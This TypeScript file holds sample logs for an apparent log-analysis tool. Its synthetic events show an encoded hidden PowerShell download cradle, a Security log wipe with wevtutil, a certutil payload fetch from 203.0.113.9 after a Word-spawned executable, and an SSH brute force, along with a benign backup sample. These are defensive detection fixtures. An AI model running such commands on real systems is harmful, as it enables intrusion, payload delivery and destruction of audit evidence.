// Built-in sample logs so the tool produces a real report on first load.
// JSON samples are stored as objects and serialized, which keeps Windows path
// escaping readable. The auth sample is raw syslog text.

export interface Sample {
  id: string
  label: string
  description: string
  text: string
}

const windowsSecurity = [
  {
    TimeCreated: '2026-05-28T14:32:10Z',
    Provider: 'Microsoft-Windows-Security-Auditing',
    EventID: 4688,
    Computer: 'WIN-FIN-07',
    EventData: {
      SubjectUserName: 'j.harper',
      NewProcessName: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      ParentProcessName: 'C:\\Windows\\System32\\cmd.exe',
      CommandLine:
        'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
    },
  },
  {
    TimeCreated: '2026-05-28T14:36:55Z',
    Provider: 'Microsoft-Windows-Security-Auditing',
    EventID: 4688,
    Computer: 'WIN-FIN-07',
    EventData: {
      SubjectUserName: 'j.harper',
      NewProcessName: 'C:\\Windows\\System32\\wevtutil.exe',
      ParentProcessName: 'C:\\Windows\\System32\\cmd.exe',
      CommandLine: 'wevtutil cl Security',
    },
  },
]

const sysmon = [
  {
    TimeCreated: '2026-05-28T09:12:44Z',
    Provider: 'Microsoft-Windows-Sysmon',
    EventID: 1,
    Computer: 'WKS-HR-12',
    EventData: {
      User: 'CORP\\a.singh',
      Image: 'C:\\Users\\a.singh\\AppData\\Local\\Temp\\invoice_update.exe',
      ParentImage: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
      CommandLine: '"invoice_update.exe" /silent',
      Hashes: 'SHA256=9F2C4A1B7E33D0A5C8F1E6B2A9D74C0F5E8B3A1D2C4F6071829A0B1C2D3E4F50',
    },
  },
  {
    TimeCreated: '2026-05-28T09:13:01Z',
    Provider: 'Microsoft-Windows-Sysmon',
    EventID: 1,
    Computer: 'WKS-HR-12',
    EventData: {
      User: 'CORP\\a.singh',
      Image: 'C:\\Windows\\System32\\certutil.exe',
      ParentImage: 'C:\\Users\\a.singh\\AppData\\Local\\Temp\\invoice_update.exe',
      CommandLine:
        'certutil -urlcache -split -f http://203.0.113.9/p.bin C:\\Users\\a.singh\\AppData\\Local\\Temp\\p.bin',
    },
  },
]

const benign = [
  {
    timestamp: '2026-05-28T10:00:00Z',
    host: 'WKS-IT-03',
    user: 'svc.backup',
    process: 'C:\\Program Files\\Veeam\\Backup\\backup.exe',
    command_line: 'backup.exe --run daily --quiet',
    message: 'Scheduled backup job started',
  },
  {
    timestamp: '2026-05-28T10:00:42Z',
    host: 'WKS-IT-03',
    user: 'svc.backup',
    process: 'C:\\Program Files\\Veeam\\Backup\\backup.exe',
    command_line: 'backup.exe --verify',
    message: 'Backup verification completed',
  },
]

const authLog = `May 28 03:14:01 web01 sshd[2451]: Failed password for invalid user admin from 198.51.100.23 port 51212 ssh2
May 28 03:14:05 web01 sshd[2453]: Failed password for invalid user root from 198.51.100.23 port 51230 ssh2
May 28 03:14:09 web01 sshd[2455]: Failed password for invalid user oracle from 198.51.100.23 port 51244 ssh2
May 28 03:14:14 web01 sshd[2461]: Failed password for deploy from 198.51.100.23 port 51260 ssh2
May 28 03:14:19 web01 sshd[2468]: Failed password for deploy from 198.51.100.23 port 51272 ssh2
May 28 03:14:24 web01 sshd[2475]: Failed password for deploy from 198.51.100.23 port 51288 ssh2
May 28 03:14:31 web01 sshd[2490]: Failed password for deploy from 198.51.100.23 port 51301 ssh2
May 28 03:14:39 web01 sshd[2502]: Accepted password for deploy from 198.51.100.23 port 51320 ssh2`

export const SAMPLES: Sample[] = [
  {
    id: 'windows-encoded-powershell',
    label: 'Windows: encoded PowerShell + log clearing',
    description: 'Security 4688 events showing a hidden encoded PowerShell launch and a Security log wipe.',
    text: JSON.stringify(windowsSecurity, null, 2),
  },
  {
    id: 'sysmon-malicious-doc',
    label: 'Sysmon: malicious document chain',
    description: 'Sysmon Event 1 showing Word spawning a Temp executable that then runs certutil to pull a payload.',
    text: JSON.stringify(sysmon, null, 2),
  },
  {
    id: 'ssh-brute-force',
    label: 'Linux: SSH brute force into success',
    description: 'auth.log with repeated failed SSH logons from one IP followed by a successful login.',
    text: authLog,
  },
  {
    id: 'benign-backup',
    label: 'Benign: scheduled backup',
    description: 'Generic JSON events with no malicious indicators. Demonstrates a clean, all-clear report.',
    text: JSON.stringify(benign, null, 2),
  },
]
